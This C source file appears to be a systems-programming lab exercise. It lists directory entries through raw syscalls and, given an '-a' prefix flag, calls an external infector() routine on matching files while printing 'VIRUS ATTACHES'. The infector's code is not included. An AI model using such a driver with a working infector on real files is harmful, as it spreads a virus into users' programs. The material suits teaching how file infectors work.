#include "util.h"
#include <dirent.h>

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291
#define SYS_GETDENTS 141

extern int system_call(int syscall_number, ...);
extern void infector(char *c);

typedef struct ent
{
  int inode;
  int offset;
  short len;
  char buf[];
} ent;


int main (int argc , char* argv[], char* envp[])
{
    char *file_prefix;
    int attach_virus = 0;
    char buffer[8192];
    ent *entp;

    int fd = system_call(SYS_OPEN,".",0,0777);
    if (fd == -1) {system_call(0x55);}
    int count = system_call(SYS_GETDENTS, fd, buffer, sizeof(buffer));

    if ((argc > 1) && (argv[1][0] == '-') && (argv[1][1] == 'a'))
    {
        attach_virus = 1;
        file_prefix = argv[1] + 2;
    }

    int i;
    for(i = 0; i < count; i += entp->len)
    {
        entp = (struct ent *) (buffer + i);

        if ((attach_virus == 1) && (strncmp(entp->buf, file_prefix, strlen(file_prefix)) == 0))
        {
            system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHES: ", 16);
            infector(entp->buf);
        }

        if ((entp->buf[0] != '.') && (strcmp(entp->buf, ".") != 0) && (strcmp(entp->buf, "..") != 0))
        {
            system_call(SYS_WRITE, STDOUT, entp->buf, strlen(entp->buf));
            system_call(SYS_WRITE, STDOUT, "\n", 1);
        }
    }

    return 0;
}
